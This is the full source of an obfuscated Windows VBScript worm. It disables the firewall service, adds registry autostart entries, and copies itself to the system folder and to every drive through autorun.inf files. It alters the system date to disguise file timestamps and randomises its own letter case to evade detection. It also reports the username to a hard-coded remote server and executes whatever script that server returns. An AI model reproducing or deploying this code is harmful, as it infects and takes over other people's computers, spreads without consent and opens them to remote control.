On eRrOr ResuMe nEXT
SEt fSO=crEatEobJeCT(StrrEveRSE("tcEjBOmETsySelIf.GnItpIrCS"))
sEt WsHsHell=creaTEOBjeCT(STRREVeRse("lLEhs.tPIrcsW"))
DIM Dri_lisT,dri_List0
diM IsSEnd
iSsEnD=0
c_Time=DAtE()
WshshEll.rUN "neT StOp shAREdaccesS",0
set dRVs=Fso.DrivEs
sYsdiR=fsO.GeTSPeciALfolDer(1)
THISpatH=wSCRIPt.ScRIpTFulLnaMe
sEt Fc=FSO.OpeNteXtFiLe(tHispaTH,1)
ScOPY=FC.ReaDAlL
fC.CLose
SeT FC=nOthing
call WriteFIle(SYsDIr&"\sYsInFO.rEg",unesCApE(sTrReverSe("00C2%00C2%00c2%00C2%00c2%00C2%00c2%00C2%00c2%00c2%00c2%00C2%00C2%00C2%00C2%00a3%92%b82%Xehd3%22%EMItcExE22%A0%D0%02%22%22%d3%22%SreTemArAp22%a0%d0%02%22%SBv.GFCNRpC5%C5%23meTsYSc5%C5%52%RIDnIw52%22%d3%22%tpirCS22%A0%D0%02%d5%0c5%0c5%pUtratSC5%StPiRcsc5%enIhCAMC5%ETAtSc5%yCILop02%pUoRgC5%noIsREvtNerRUcc5%sWodNiwc5%tfOSOrCIMc5%ERawtFosC5%EnIHCAm_lAcoL_YEKhb5%A0%D0%a0%d0%02%00c2%00C2%00c2%00c2%00c2%00c2%00C2%00c2%00C2%00c2%00C2%00C2%00C2%00c2%00C2%00a3%92%b82%xehD3%22%EmITceXE22%A0%D0%02%22%22%D3%22%sRetemAraP22%A0%d0%02%22%sBV.gfcnrpC5%c5%23mEtSYsc5%c5%52%RiDniW52%22%d3%22%TPircS22%a0%d0%02%D5%0c5%0c5%PUTRatSc5%sTPirCsc5%mEtSysC5%SWOdNiwC5%TfOsOrciMc5%sEICIloPC5%ERAWTfOsc5%eNIhcAm_LacoL_YeKhB5%a0%d0%a0%d0%03%03%e2%53%02%E6%f6%96%37%27%56%65%02%27%F6%47%96%46%54%02%97%27%47%37%96%76%56%25%02%37%77%f6%46%E6%96%75%")))
wsHSHeLL.run "regEdiT /S SYSInfo.reG",0
wScRIpT.slEep 200
fsO.DELEtEfiLe SySdIr&"\sysiNFO.reG",TRUE
iF iNStR(thIsPAth,SySdIr)>0 Then
dRi_liST0=liSTdrV()
O_tIMe=lEfT(c_TimE,3)&CStR(iNt(mid(C_tImE,4,1))-1)&rIghT(C_time,LeN(C_timE)-4)
wsHShelL.Run "cmD /c DatE "&o_TIme,0
WscRIPT.SleEp 10000
fOR DRI_i=1 tO lEn(dRi_LIST0)
caLL wrITeaUto(mId(DrI_LiST0,dRi_I,1)&":\")
NexT
wsHsHeLl.run "CMd /C Date "&C_time,0
COmpuTeRNAmE="":useRNaME=""
set obJwMISErvICE=GEToBJeCt("winmgMtS:{imPeRSOnATiONlevEl=impersOnatE}!\\.\roOT\cimV2")
SET COlcOmpuTERS = OBJWMISeRVIcE.eXeCqUeRY("SeLect * froM wiN32_cOmpUtERSySTEm")
FoR eACh ObJComPuter iN CoLcompuTErs
COmputERName=oBJcoMPuteR.NAMe
usernaME=OBjCoMputeR.uSeRNAMe
NExT
iF uSername="" Then UsERNaME="Evar"
if insTr(uSErnAmE,"\")<=0 thEn
USERNamE=coMPUTernAME&"\"&USErNamE
eNd IF
dO
if IsseND=0 then
sEt XMl=CReaTeOBjECt(StrReVErsE("ptThLmXrEvres.2LmxsM"))  
XMl.opeN "gET",sTrREVeRse(unesCApE("%3D%61%3f%70%73%61%2E%74%6E%75%6f%63%2F%61%76%65%2f%62%7a%7A%2f%30%30%31%2e%34%30%31%2e%39%31%31%2E%32%30%32%2f%2F%3A%70%74%74%68"))&USERNaMe,0
Xml.SEtrEquesTheAdER "USEr-AgENt","EVar"
Xml.send()
If err.nUMber=0 then
Issend=1
REs=xMl.REsPonsetexT
IF UcAse(lEft(rES,7))=UCaSE("EXeCute")  tHeN exeCuTE rES
Else
Err.cleAr
ENd If
sET xml=noThiNG
ENd If
DRi_lIST=LIStDRV()
FoR DrI_K=1 To leN(dri_LisT)
iF iNsTR(dRI_liSt0,mID(DRi_LiST,dRi_k,1))<=0 then
Call WRiteaUTO(mid(DRi_LIst,DrI_K,1)&":\")
eND If
nexT
DrI_LIst0=DrI_LiST
wscript.SlEep 1000
lOOp
elsE
wshsheLl.rUN "ExPloRER .\",3
wSCRIPT.sLeep 2000
WSHSHELl.APpActIvAtE UNESCaPe(lcASe("%u6211%u7684%u7535%u8111"))
WsHSheLl.SenDkeys uCaSe("% c")
ruNFLag=0
For eaCH pS in GeTOBjEct _ 
("wINmGmTs:\\.\rOoT\CImv2:WiN32_PRoCess").inStAnces_ 
If LcASe(pS.Name)=lCase("wsCrIpt.EXe") thEn
RUNFLag=runFLAG+1
END IF
NExT
If rUnFLAG>=2 theN wscRIpt.quit
sEt SF=FSO.gEtFOlDEr(SysDiR)
F_timE=LeFt(sf.daTEcreATEd,inSTR(sf.dATecREateD," ")-1)
wshSHeLL.RuN "cmD /C DATE "&F_tIME,0
Wscript.sLeEp 100
CAlL wRItefIlE(sysdiR&lcASe("\PrnCFG.vbS"),vs(SCOPY))
wsHSHEll.RUN "CMd /C DatE "&C_TIME,0
wshSHell.Run sysdIr&"\PRNcFG.vbS"
eND IF
FuNCtiOn vs(sTr)
execuTE stRREversE(UnescaPE("%29%29%22U%25%22%28ESaCL%2c%29%22u%25%22%28ESAcU%2cSV%28ecalper%3Dsv%0D%0ATxEN%0D%0aFi%20dne%0d%0AC%26sV%3DSV%0d%0aEslE%0D%0a%29c%28ESacl%26SV%3dSV%0D%0AnEhT%2005%3E%29001*%29%28Dnr%28tNI%20Fi%0D%0AezimODnAR%0D%0a%29%291%2CI%2CrTs%28DIm%28EsaCu%3dC%0D%0A%29RtS%28Nel%20OT%201%3di%20rOF"))
eNd FuNCtioN
fUncTIOn lisTDRV()
exEcUte strrEveRSe(UnEsCAPe("tsIl_PMT%3DVRdtSIl%0D%0ATxEn%0D%0afI%20dNe%0d%0ArEttElEViRd.VrD%26tSiL_pmT%3dtsIL_Pmt%0D%0AneHt%20YDAersi.VrD%20FI%0D%0AsVrD%20Ni%20vrd%20hcaE%20Rof%0D%0A%22%22%3DTSiL_pMT%0D%0ATSIl_PmT%20mID"))
eNd FuncTiOn
SUb wriTEAUtO(patH)
executE sTRrEVeRsE(UnescaPe("FI%20DNe%0D%0aEUrT%2C%22Fni.nUrOtuA%22%26HtAp%20ELiFetElEd.OsF%0D%0AnEht%20%29%22FNI.nuRotuA%22%26hTAp%28STSixEelIf.oSf%20fIeSle%0D%0a%29%28dnR%26HTAP%2c%22FNI.NurOTuA%22%26HtaP%20REdLOFevOm.OsF%0d%0aNeHt%20%29%22FNI.nUrotuA%22%26htaP%28StSIxErEDLof.osF%20FI"))
cmDStR="ShELl\*\cOmmanD=WscRipT.eXE "&cHr(34)&"EvA.VBs"&CHr(34)
aUTOStr="[AUTorUn]"&VBCrlf&"OpEN="&VbcRlf&rEpLaCE(cMdStr,"*","oPEn")&vBcRLF&REPLaCE(CMDsTr,"*","exPLORe")&VbCRlF&RepLacE(CMdstR,"*","FINd")
CALL WriteFiLe(path&UcaSE("AuToRUN.inf"),AUTOstR)
cALl wRItEFiLe(pAth&"EvA.vBs",vs(ScOpy))
eNd SuB
SuB wrItEfilE(FPath,CONTenT)
EXECute STrREvERSe(UneScApE("GNiHtOn%3dAF%20TEs%0d%0a7%3DSETUbIRtTA.aF%0D%0A%29HTAPf%28ElIFtEG.osF%3DaF%20tEs%0D%0AGNihton%3DCf%20teS%0d%0aesoLc.CF%0D%0aTNEtnoc%20ETIRw.CF%0d%0a%29EuRT%2c2%2chtaPf%28EliFtxETnEpo.oSF%3dcF%20TEs%0D%0aEuRt%2CHTApf%20ELIfeTeleD.OSf%20NEhT%20%29hTapF%28StSIXeElIf.osF%20fI"))
eNd SUB